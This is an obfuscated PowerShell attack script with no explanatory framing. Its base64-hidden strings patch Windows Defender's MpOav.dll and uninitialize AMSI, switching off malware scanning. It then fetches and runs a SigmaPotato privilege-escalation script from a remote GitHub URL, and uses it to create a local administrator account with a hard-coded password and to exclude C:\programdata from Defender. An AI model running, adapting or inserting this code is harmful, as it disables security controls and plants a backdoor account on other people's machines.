function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XFw='))))[-1].Equals(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))) }
    $UnsafeNativeMethods = $SystemAssembly.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHM='))))
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0TW9kdWxlSGFuZGxl'))))
    $GetProcAddress = $UnsafeNativeMethods.GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0UHJvY0FkZHJlc3M='))), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UmVmbGVjdGVkRGVsZWdhdGU='))))
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW5NZW1vcnlNb2R1bGU='))), $false)
    $TypeBuilder = $ModuleBuilder.DefineType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TXlEZWxlZ2F0ZVR5cGU='))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q2xhc3MsIFB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcw=='))), [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWM='))), [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVudGltZSwgTWFuYWdlZA=='))))
    $MethodBuilder = $TypeBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('SW52b2tl'))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWw='))), $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('UnVudGltZSwgTWFuYWdlZA=='))))
        
    Write-Output $TypeBuilder.CreateType()
}
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
$LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
$GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
$VirtualProtectDelegate)

$hModule = $LoadLibrary.Invoke(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('TXBPYXYuZGxs'))))
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RGxsR2V0Q2xhc3NPYmplY3Q='))))
$p = 0
$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) 
$aapt = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHhCOA==')))
$qkwf = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHg1Nw==')))
$snxi = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHgwMA==')))
$wnan = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHgwNw==')))
$nchj = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHg4MA==')))
$yywa = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('MHhDMw==')))
$ret_minus = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
$object = [Ref].Assembly.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLk1h')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmFn')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZW1l')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bnQuQXV0b20=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXRpb24uQQ==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bXM=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aVU=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGk=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bHM='))))
$Uninitialize = $object.GetMethods(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Tg==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('b25QdQ==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YmxpYyxzdA==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YXQ=')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aWM=')))) | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/farzas1/bad/refs/heads/main/Invoke-SigmaPotato.ps1')
Invoke-SigmaPotato -command "net user k kopq@123 /add"
Invoke-SigmaPotato -command "net localgroup administrators k /add"
Invoke-SigmaPotato -command "powershell Add-MpPreference -ExclusionPath C:\programdata"
